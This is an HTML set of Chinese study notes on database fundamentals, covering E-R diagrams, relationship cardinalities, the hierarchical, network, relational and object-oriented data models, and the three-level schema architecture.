<p><img src="https://img.npfs06.top/20210302150730.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="一对一联系（1-1-1）"><a href="#一对一联系（1-1-1）" class="headerlink" title="一对一联系（1:1:1）"></a>一对一联系（1:1:1）</h4><p><strong>实例</strong></p>
<ul>
<li>一个独生子女只有一个父亲，一个母亲</li>
<li>一个父亲也只有一个独生子女</li>
<li>一个母亲也只有一个独生子女<br><img src="https://img.npfs06.top/20210302150745.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="多对多联系（m-n-p）"><a href="#多对多联系（m-n-p）" class="headerlink" title="多对多联系（m:n:p）"></a>多对多联系（m:n:p）</h4><p><strong>实例</strong><br>供应商、项目、零件三个实体型<br>一个供应商可以供给多个项目多种零件<br>每个项目可以使用多个供应商供应的零件<br>每种零件可由不同供应商供给<br><img src="https://img.npfs06.top/20210302150803.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="单个实体型内的联系"><a href="#单个实体型内的联系" class="headerlink" title="单个实体型内的联系"></a>单个实体型内的联系</h3><h4 id="一对多联系（1-n）-1"><a href="#一对多联系（1-n）-1" class="headerlink" title="一对多联系（1:n）"></a>一对多联系（1:n）</h4><p><strong>实例</strong><br>职工实体型内部具<code>有领导与被领导</code>的联系<br>某一职工（干部）“领导”若干名职工<br>一个职工仅被另外一个职工直接领导<br>这是一对多的联系</p>
<p><img src="https://img.npfs06.top/20210302150818.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="一对一联系（1-1）-1"><a href="#一对一联系（1-1）-1" class="headerlink" title="一对一联系（1:1）"></a>一对一联系（1:1）</h4><ul>
<li>身份证可以唯一确认一个人的身份，人与身份证<code>有确认和被确认</code>的关系</li>
<li>一个身份证唯一确定一个人</li>
<li>一个人也唯一确认一个身份证<br><img src="https://img.npfs06.top/20210302150841.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="多对多联系-（m-n）"><a href="#多对多联系-（m-n）" class="headerlink" title="多对多联系 （m:n）"></a>多对多联系 （m:n）</h4><ul>
<li>饮料和厂商之间有<code>制造和被制造</code>的关系</li>
<li>多个饮料可以被多个厂商制造</li>
<li>多个厂商可以制造出多种饮料<br><img src="https://img.npfs06.top/20210302150853.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h3 id="概念模型的一种表示方法"><a href="#概念模型的一种表示方法" class="headerlink" title="概念模型的一种表示方法"></a>概念模型的一种表示方法</h3><h4 id="实体－联系方法-E-R方法"><a href="#实体－联系方法-E-R方法" class="headerlink" title="实体－联系方法(E-R方法)"></a>实体－联系方法(E-R方法)</h4><ul>
<li>E-R图也称实体-联系图(Entity Relationship Diagram)，提供了表示实体类型、属性和联系的方法，用E-R图来描述现实世界的概念模型</li>
<li>E-R方法也称为E-R模型</li>
</ul>
<h4 id="实体型"><a href="#实体型" class="headerlink" title="实体型"></a>实体型</h4><p>用矩形表示，矩形框内写明实体名。<br><img src="https://img.npfs06.top/20210302150908.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><p>用椭圆形表示，并用无向边将其与相应的实体连接起来<br><img src="https://img.npfs06.top/20210302150921.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="联系"><a href="#联系" class="headerlink" title="联系"></a>联系</h4><ul>
<li>联系本身：<br>用菱形表示，菱形框内写明联系名，并用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n或m:n）<br><img src="https://img.npfs06.top/20210302150933.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="联系的表示方法"><a href="#联系的表示方法" class="headerlink" title="联系的表示方法"></a>联系的表示方法</h4><p><img src="https://img.npfs06.top/20210302150947.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="联系的表示方法示例"><a href="#联系的表示方法示例" class="headerlink" title="联系的表示方法示例"></a>联系的表示方法示例</h4><p><img src="https://img.npfs06.top/20210302151002.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="联系的属性"><a href="#联系的属性" class="headerlink" title="联系的属性"></a>联系的属性</h4><ul>
<li><code>联系本身</code>也是一种<code>实体型</code>，<code>也可以有属性</code>。如果一个联系具有属性，则这些属性也要用无向边与该联系连接起来<br><img src="http://img.npfs06.top/20210302151014.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="一个实例"><a href="#一个实例" class="headerlink" title="一个实例"></a>一个实例</h4><p><strong>用E-R图表示某个工厂物资管理的概念模型</strong></p>
<ul>
<li>实体<br>仓库： 仓库号、面积、电话号码<br>零件 ：零件号、名称、规格、单价、描述<br>供应商：供应商号、姓名、地址、电话号码、帐号<br>项目：项目号、预算、开工日期<br>职工：职工号、姓名、年龄、职称</li>
</ul>
<p><strong>实体之间的联系如下：</strong></p>
<ul>
<li>(1)一个仓库可以存放多种零件，一种零件可以存放在多个仓库中。仓库和零件具有多对多的联系。用库存量来表示某种零件在某个仓库中的数量。<br>(2)一个仓库有多个职工当仓库保管员，一个职工只能在一个仓库工作，仓库和职工之间是一对多的联系。职工实体型中具有一对多的联系<br>(3)职工之间具有领导-被领导关系。即仓库主任领导若干保管员。<br>(4)供应商、项目和零件三者之间具有多对多的联系<br><img src="https://img.npfs06.top/20210302151031.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h2 id="非关系模型"><a href="#非关系模型" class="headerlink" title="非关系模型"></a>非关系模型</h2><h3 id="层次模型-Hierarchical-Model"><a href="#层次模型-Hierarchical-Model" class="headerlink" title="层次模型(Hierarchical Model)"></a>层次模型(Hierarchical Model)</h3><ul>
<li>层次模型是数据库系统中最早出现的数据模型</li>
<li>层次数据库系统的典型代表是IBM公司的IMS（Information Management System）数据库管理系统</li>
<li>层次模型用<code>树形结构</code>来表示各类实体以及实体间的联系</li>
</ul>
<h4 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>满足下面两个条件的基本层次联系的集合为层次模型</strong></p>
<ul>
<li>有且只有一个结点没有双亲结点，这个结点称为<code>根结点</code></li>
<li>根以外的其它结点<code>有且只有一个</code>双亲结点</li>
</ul>
<p><strong>层次模型中的几个术语</strong><br>根结点，双亲结点，兄弟结点，叶结点<br><img src="https://img.npfs06.top/20210302151046.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li>结点的双亲是<code>唯一</code>的</li>
<li>只能直接处理<code>一对多</code>的实体联系</li>
<li>每个记录类型可以定义一个排序字段，也称为·<code>码字段</code></li>
<li>任何记录值只有<code>按其路径查看</code>时，才能显出它的全部意义</li>
<li><code>没有</code>一个子女记录值能够<code>脱离</code>双亲记录值而独立存在</li>
</ul>
<p><img src="https://img.npfs06.top/20210302151100.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="https://img.npfs06.top/20210302151115.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="多对多联系在层次模型中的表示"><a href="#多对多联系在层次模型中的表示" class="headerlink" title="多对多联系在层次模型中的表示"></a>多对多联系在层次模型中的表示</h4><p><strong>方法：</strong></p>
<ul>
<li>将多对多联系分解成一对多联系</li>
</ul>
<p><strong>分解方法：</strong></p>
<ul>
<li>冗余结点法</li>
<li>虚拟结点法</li>
</ul>
<h4 id="数据操纵与完整性约束"><a href="#数据操纵与完整性约束" class="headerlink" title="数据操纵与完整性约束"></a>数据操纵与完整性约束</h4><p><strong>层次模型的数据操纵：</strong></p>
<ul>
<li>查询</li>
<li>插入</li>
<li>删除</li>
<li>更新</li>
</ul>
<p><strong>层次模型的完整性约束条件：</strong></p>
<ul>
<li>无相应的双亲结点值就不能插入子女结点值</li>
<li>如果<code>删除双亲</code>结点值，则相应的<code>子女结点</code>值也被<code>同时删除</code></li>
<li>更新操作时，应更新所有相应记录，以保证数据的一致性</li>
</ul>
<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p><strong>邻接法：</strong><br>按照层次树<code>前序遍历（T-L-R）</code>的顺序把所有记录值依次邻接存放，即通过物理空间的位置相邻来实现层次顺序。又可分为：<code>子女－兄弟链接法</code>和<code>层次序列链接法</code>。</p>
<p><img src="https://img.npfs06.top/20210302151131.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h5 id="子女-兄弟链接法"><a href="#子女-兄弟链接法" class="headerlink" title="子女-兄弟链接法"></a>子女-兄弟链接法</h5><ul>
<li>每个记录设两类指针，分别指向<code>最左边的子女</code>（每个记录型对应一个）和<code>最近的兄弟</code><br><img src="https://img.npfs06.top/20210302151150.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h5 id="层次序列链接法"><a href="#层次序列链接法" class="headerlink" title="层次序列链接法"></a>层次序列链接法</h5><ul>
<li>按树的<code>前序穿越顺序</code>链接各记录值<br><img src="https://img.npfs06.top/20210302151207.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h4 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h4><ul>
<li><strong>优点：</strong><br>层次模型的数据<code>结构</code>比较简单<code>清晰</code><br><code>查询效率高，性能优于关系模型，不低于网状模型</code><br>层次数据模型提供了良好的完整性支持</li>
<li><strong>缺点：</strong><br>多对多联系表示不自然<br>对<code>插入</code>和<code>删除</code>操作的<code>限制多</code>，应用<code>程序</code>的<code>编写</code>比较<code>复杂</code><br>查询子女结点必须通过双亲结点<br>由于结构严密，层次命令趋于程序化</li>
</ul>
<h3 id="网状模型-Network-Model"><a href="#网状模型-Network-Model" class="headerlink" title="网状模型(Network Model)"></a>网状模型(Network Model)</h3><p><strong>网状数据库系统采用网状模型作为数据的组织方式</strong></p>
<blockquote>
<ul>
<li>典型代表是DBTG系统：<br>亦称CODASYL系统<br>70年代由DBTG提出的一个系统方案<br>奠定了数据库系统的基本概念、方法和技术</li>
<li>实际系统:<br>Cullinet Software Inc.公司的 IDMS<br>Univac公司的 DMS1100<br>Honeywell公司的IDS/2<br>HP公司的IMAGE</li>
</ul>
</blockquote>
<h4 id="数据结构-2"><a href="#数据结构-2" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>网状模型:</strong><br>满足下面两个条件的基本层次联系的集合：</p>
<ol>
<li>允许一个以上的结点无双亲；</li>
<li>一个结点可以有多于一个的双亲。</li>
</ol>
<p><strong>表示方法(与层次数据模型相同):</strong><br><code>实体型</code>：用记录类型描述<br>每个<code>结点</code>表示一个记录类型（实体）<br><code>属性</code>：用字段描述<br>每个记录类型可包含若干个字段<br><code>联系</code>：用结点之间的<code>连线</code>表示记录类型（实体）之<br>间的<code>一对多的父子联系</code></p>
<p><strong>网状模型与层次模型的区别:</strong></p>
<ul>
<li>网状模型允许多个结点没有双亲结点</li>
<li>网状模型允许结点有多个双亲结点</li>
<li>网状模型允许两个结点之间有多种联系（复合联系）</li>
<li>网状模型可以更直接地去描述现实世界</li>
<li>层次模型实际上是网状模型的一个特例</li>
</ul>
<p><code>网状模型中子女结点与双亲结点的联系可以不唯一</code><br>要为<code>每个联系命名</code>，并指出与<code>该联系有关</code>的<code>双亲记录</code>和<code>子女记录</code><br><img src="https://img.npfs06.top/20210302151222.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><img src="https://img.npfs06.top/20210302151240.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><strong>多对多联系在网状模型中的表示:</strong><br>方法：将<code>多对多</code>联系直接分解成<code>一对多</code>联系</p>
<p><code>例如</code>：一个学生可以选修若干门课程，·某一课程可以被多个学生选修，学生与课程之间是多对多联系 ·</p>
<ul>
<li>引进一个学生选课的联结记录，由3个数据项组成<br>学号<br>课程号<br>成绩<br>表示某个学生选修某一门课程及其成绩</li>
</ul>
<p><img src="https://img.npfs06.top/20210302151256.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="网状数据模型的操纵与完整性约束（续）"><a href="#网状数据模型的操纵与完整性约束（续）" class="headerlink" title="网状数据模型的操纵与完整性约束（续）"></a>网状数据模型的操纵与完整性约束（续）</h4><p><strong>网状数据库系统（如DBTG）对数据操纵加 了一些限制，提供了一定的完整性约束</strong></p>
<ul>
<li><code>码</code>：唯一标识记录的数据项的集合</li>
<li>一个联系中<code>双亲记录</code>与<code>子女记录</code>之间是<code>一对多</code>联系</li>
<li>支持双亲记录和子女记录之间某些约束条件</li>
</ul>
<h4 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h4><p><strong>关键：</strong></p>
<ul>
<li>实现记录之间的联系</li>
</ul>
<p><strong>常用方法：</strong></p>
<ul>
<li>单向链接</li>
<li>双向链接</li>
<li>环状链接</li>
<li>向首链接</li>
</ul>
<p><img src="https://img.npfs06.top/20210302151309.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h4><ul>
<li><strong>优点</strong><br>能够更为直接地描述现实世界，如一个结点可以有多个双亲；<br>具有良好的性能，存取效率较高；</li>
<li><strong>缺点</strong><br>结构比较复杂，而且随着应用环境的扩大，数据库的结构就变得越来越复杂，不利于最终用户掌握；<br>DDL、DML语言复杂，用户不容易使用；</li>
</ul>
<h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><p>关系数据库系统采用<code>关系模型</code>作为数据的组织方式<br>1970年美国IBM公司San Jose研究室的研究员E.F.Codd首次提出了数据库系统的关系模型<br>计算机厂商新推出的数据库管理系统几乎都支持关系模型</p>
<h3 id="数据结构-3"><a href="#数据结构-3" class="headerlink" title="数据结构"></a>数据结构</h3><p>在用户观点下，<code>关系模型中数据的逻辑结构</code>是一张<code>二维表</code>，它由<code>行</code>和<code>列</code>组成。<br><strong>几个名词解释：</strong></p>
<ul>
<li><code>关系</code>（Relation）<br>一个关系对应通常说的一张表</li>
<li><code>元组</code>（Tuple）<br>表中的一行即为一个元组</li>
<li><code>属性</code>（Attribute）<br>表中的一列即为一个属性，给每一个属性起一个名称即属性名</li>
<li><code>主码</code>（Key）<br>表中的某个<code>属性组</code>，它可以<code>唯一确定一个元组</code>。</li>
<li><code>域</code>（Domain）<br>属性的取值范围。</li>
<li><code>分量</code><br>元组中的一个属性值。</li>
<li><code>关系模式</code><br>对关系的描述<br>关系名（属性1，属性2，…，属性n）<br>学生（学号，姓名，年龄，性别，系，年级）<br><img src="https://img.npfs06.top/20210302151326.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>举几个例子：</strong></li>
<li><code>例1</code><br>学生、系、系与学生之间的·<code>一对多</code>联系：<br>学生（学号，姓名，年龄，性别，<code>系号</code>，年级）<br>系 (<code>系号</code>，系名，办公地点)</li>
<li><code>例2</code><br>系、系主任、系与系主任间的<code>一对一</code>联系</li>
<li><code>例3</code><br>学生、课程、学生与课程之间的<code>多对多</code>联系：<br>学生（<code>学号</code>，姓名，年龄，性别，系号，年级）<br>课程（<code>课程号</code>，课程名，学分）<br>选修（<code>学号</code>，<code>课程号</code>，成绩）</li>
</ul>
<p><strong>规范化：</strong></p>
<ul>
<li>关系必须是规范化的，满足一定的规范条件</li>
<li>最基本的规范条件：<code>关系的每一个分量必须是一个不可分的数据项, 不允许表中还有表</code></li>
<li>图1.27中工资和扣除是可分的数据项 ,不符合关系模型要求<br><img src="https://img.npfs06.top/20210302151342.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<p><img src="https://img.npfs06.top/20210302151356.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h3 id="关系数据模型的操纵与完整性约束"><a href="#关系数据模型的操纵与完整性约束" class="headerlink" title="关系数据模型的操纵与完整性约束"></a>关系数据模型的操纵与完整性约束</h3><ul>
<li><code>数据操作</code>是集合操作，操作对象和操作结果都是关系<br>查询<br>插入<br>删除<br>更新</li>
<li><code>数据操作是集合操作，操作对象和操作结果都是关系</code>，即若干元组的集合存取路径对用户隐蔽，用户只要指出“干什么”，不必详细说明“怎么干”</li>
<li>关系的<code>完整性约束条件</code><br>实体完整性<br>参照完整性<br>用户定义的完整性</li>
</ul>
<h3 id="存储结构-2"><a href="#存储结构-2" class="headerlink" title="存储结构"></a>存储结构</h3><ul>
<li>实体及实体间的联系都用<code>表</code>来表示<br>表以文件形式存储<br> 有的DBMS一个表对应一个操作系统文件；<br> 有的DBMS自己设计文件结构；</li>
</ul>
<h3 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h3><ul>
<li>优点<ul>
<li>建立在严格的数学概念的基础上;</li>
<li>概念单一:<br>实体和各类联系都用关系来表示;<br> 对数据的检索结果也是关系;</li>
<li>关系模型的存取路径对用户透明;<br>具有更高的数据独立性，更好的安全保密性<br> 简化了程序员的工作和数据库开发建立的工作;</li>
</ul>
</li>
<li>缺点<ul>
<li>存取路径对用户透明导致查询效率往往不如非关系数据模型;</li>
<li>为提高性能，必须对用户的查询请求进行优化,增加了开发DBMS的难度;</li>
</ul>
</li>
</ul>
<h2 id="面向对象数据模型"><a href="#面向对象数据模型" class="headerlink" title="面向对象数据模型"></a>面向对象数据模型</h2><ul>
<li>将<code>语义数据模型</code>和<code>面向对象程序设计方法</code>结合起来，用<code>面向对象观点</code>来描述现实世界<code>实体</code>(对象)的<code>逻辑组织</code>、<code>对象间限制</code>、<code>联系</code>等的<code>模型</code>。</li>
<li>一系列面向对象核心概念构成了面向对象数据模型( Object Oriented Data Model, 00模型)的基础，主要包括以下一些概念:<ul>
<li>(1)现实世界中的任何事物都被建模为对象。每个对象具有一个唯一的对象标识<br>(OID)。</li>
<li>(2)对象是其状态和行为的封装，其中状态是对象属性值的集合，行为是变更对象状<br>态的方法集合。</li>
<li>(3)具有相同属性和方法的对象的全体构成了类，类中的对象称为类的实例。</li>
<li>(4)类的属性的定义域也可以是类，从而构成了类的复合。类具有继承性，一个类可以继承另一个类的属性与方法，被继承类和继承类也称为超类和子类。类与类之间的复合与继承关系形成了一个有向无环图，称为类层次。</li>
<li>(5)对象是被封装起来的，它的状态和行为在对象外部不可见，从外部只能通过对象显式定义的消息传递对对象进行操作。</li>
</ul>
</li>
<li>面向对象数据库(OODB)的研究始于20世纪80年代，有许多面向对象数据库产品相继问世，较著名的有Object Store、02、ONTOS等。</li>
<li>与传统数据库一样，面向对象数据库系统对数据的操纵包括数据查询、增加、删除、修改等，也具有并发控制、故障恢复、存储管理等完整的功能。不仅能支持传统数据库应用，也能支持非传统领域的应用，包括CAD/CAM、OA、CIMS、GIS以及图形、图像等多媒体领域、工程领域和数据集成等领域。</li>
<li>尽管如此，由于面向对象数据库操作语言过于复杂，没有得到广大用户，特别是开发人员的认可，加上面向对象数据库企图完全替代关系数据库管理系统的思路，增加了企业系统升级的负担，客户不接受，·<code>面向对象数据库产品终究没有在市场上获得成功。</code></li>
</ul>
<h2 id="对象关系模型"><a href="#对象关系模型" class="headerlink" title="对象关系模型"></a>对象关系模型</h2><ul>
<li><code>对象关系数据库系统</code>(Object Relational DataBase System, ORDBS) 是<code>关系数据库</code>与<code>面向对象数据库</code>的结合。</li>
<li>它保持了关系数据库系统的非过程化数据存取方式和数据独立性，继承了关系数据库系统已有的技术，支持原有的数据管理，又能支持00模型和对象管理。各数据库厂商都在原来的产品基础上进行了扩展。</li>
<li>1999 年发布的SQL标准(也称为SQL99)，增加了SQL/Object Language Binding, 提供了面向对象的功能标准。SQL99对ORDBS标准的制定滞后于实际系统的实现。所以各个ORDBS产品在支持对象模型方面虽然思想一致，但是所采用的术语、语言语法、扩展的功能都不尽相同。</li>
</ul>
<h1 id="数据库系统结构和组成"><a href="#数据库系统结构和组成" class="headerlink" title="数据库系统结构和组成"></a>数据库系统结构和组成</h1><p><strong>思维导图</strong></p>
<p><img src="https://img.npfs06.top/20210302151623.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="数据库系统结构"><a href="#数据库系统结构" class="headerlink" title="数据库系统结构"></a>数据库系统结构</h2><h3 id="两种角度"><a href="#两种角度" class="headerlink" title="两种角度"></a>两种角度</h3><ul>
<li>从数据库<code>管理系统角度</code>看，数据库系统通常采用三级模式结构，是数据库系统<code>内部</code>的系统结构</li>
<li>从数据库<code>最终用户角度</code>看（数据库系统<code>外部</code>的体系结构） ，数据库系统的结构分为:<br>单用户结构<br>主从式结构<br>分布式结构<br>客户／服务器<br>浏览器／应用服务器／数据库服务器多层结构等</li>
</ul>
<h3 id="数据库系统模式的概念"><a href="#数据库系统模式的概念" class="headerlink" title="数据库系统模式的概念"></a>数据库系统模式的概念</h3><blockquote>
<p>来自张教授的解疑：<code>模式是数据库结构的描述、关系模式是表的结构的描述</code>;</p>
</blockquote>
<p><strong>“型” 和“值” 的概念</strong></p>
<ul>
<li>型(Type)<br>对某一类数据的结构和属性的说明</li>
<li>值(Value)<br>是型的一个具体赋值</li>
</ul>
<p><strong>例如</strong><br>学生记录型：<br>（学号，姓名，性别，系别，年龄，籍贯）<br>一个记录值：<br>（900201，李明，男，计算机，22，江苏）</p>
<p><strong>模式（Schema）</strong></p>
<ul>
<li><code>数据库逻辑结构和特征的描述</code></li>
<li><code>是型的描述</code></li>
<li>反映的是数据的结构及其联系</li>
<li>模式是相对稳定的</li>
</ul>
<p><strong>实例（Instance）</strong></p>
<ul>
<li>模式的一个具体值</li>
<li><code>反映数据库某一时刻的状态</code></li>
<li><code>同一个模式可以有很多实例</code></li>
<li>实例随数据库中的数据的更新而变动</li>
</ul>
<p><strong>一个数据库只有一个模式，可以把模式看成唯一的数据库，实例就是数据库里面的多个表</strong></p>
<p><code>例如</code>：在学生选课<code>数据库模式</code>中，包含学生记录、课程记录和学生选课记录</p>
<ul>
<li>2003年的一个学生数据库<code>实例</code>，包含：<br>2003年学校中所有学生的记录<br>学校开设的所有课程的记录<br>所有学生选课的记录</li>
<li><code>2002</code>年度学生<code>数据库模式对应的实例</code>与<code>2003</code>年度学生<code>数据库模式对应的实例</code>是不同的</li>
</ul>
<h3 id="数据库系统的三级模式结构"><a href="#数据库系统的三级模式结构" class="headerlink" title="数据库系统的三级模式结构"></a>数据库系统的三级模式结构</h3><p><img src="https://img.npfs06.top/20210302151638.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="模式（Schema）"><a href="#模式（Schema）" class="headerlink" title="模式（Schema）"></a>模式（Schema）</h4><p><strong>模式（也称逻辑模式）</strong></p>
<ul>
<li>数据库中全体<code>数据的逻辑结构和特征的描述</code></li>
<li>所有<code>用户的公共数据视图</code>，综合了所有用户的需求</li>
</ul>
<p><strong>一个数据库只有一个模式，可以把模式看成唯一的数据库，实例就是数据库里面的多个表</strong></p>
<p><strong>模式的地位：是数据库系统模式结构的中间层</strong></p>
<ul>
<li>与数据的物理存储细节和硬件环境无关</li>
<li>与具体的应用程序、开发工具及高级程序设计语言无关</li>
</ul>
<p><strong>模式的定义:</strong></p>
<ul>
<li>数据的逻辑结构（数据项的名字、类型、取值范围等）</li>
<li>数据之间的联系</li>
<li>数据有关的安全性、完整性要求</li>
</ul>
<h4 id="外模式（External-Schema）"><a href="#外模式（External-Schema）" class="headerlink" title="外模式（External Schema）"></a>外模式（External Schema）</h4><p><strong>外模式（也称子模式或用户模式）</strong></p>
<ul>
<li>数据库用户（包括应用程序员和最终用户）使用的<code>局部</code>数据的逻辑结构和特征的描述</li>
<li>数据库用户的数据视图，是与某一应用有关的数据的逻辑表示，<code>可以看成把数据库的部分数据，运用在不同的应用程序上，在UI界面上显示</code></li>
</ul>
<p><strong>一个数据库只有一个模式，可以把模式看成唯一的数据库，实例就是数据库里面的多个表</strong><br><strong>外模式的地位：介于模式与应用之间</strong></p>
<ul>
<li>模式与外模式的关系：一对多<br>外模式通常是模式的子集;<br>一个<code>数据库</code>可以有多个<code>外模式</code>。反映了不同的用户的应用需求、看待数据的方式、对数据保密的要求;<br>对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同;</li>
<li>外模式与应用的关系：一对多<br>同一外模式也可以为某一用户的多个应用系统所使用;<br>但一个应用程序只能使用一个外模式;<code>可以看成把数据库的部分数据，运用在不同的应用程序上，在UI界面上显示</code></li>
</ul>
<p><strong>外模式的用途</strong></p>
<ul>
<li>保证数据库安全性的一个有力措施；</li>
<li>每个用户只能看见和访问所对应的外模式中的数据；</li>
</ul>
<h4 id="内模式（Internal-Schema）"><a href="#内模式（Internal-Schema）" class="headerlink" title="内模式（Internal Schema）"></a>内模式（Internal Schema）</h4><p><strong>内模式（也称存储模式）</strong></p>
<ul>
<li>是数据<code>物理结构和存储方式</code>的描述</li>
<li>是<code>数据</code>在<code>数据库内部</code>的表示方式:<ul>
<li>记录的存储方式（顺序存储，按照B树结构存储，<br>按hash方法存储）</li>
<li>索引的组织方式</li>
<li>数据是否压缩存储</li>
<li>数据是否加密</li>
<li>数据存储记录结构的规定</li>
</ul>
</li>
<li><code>一个数据库只有一个内模式</code></li>
</ul>
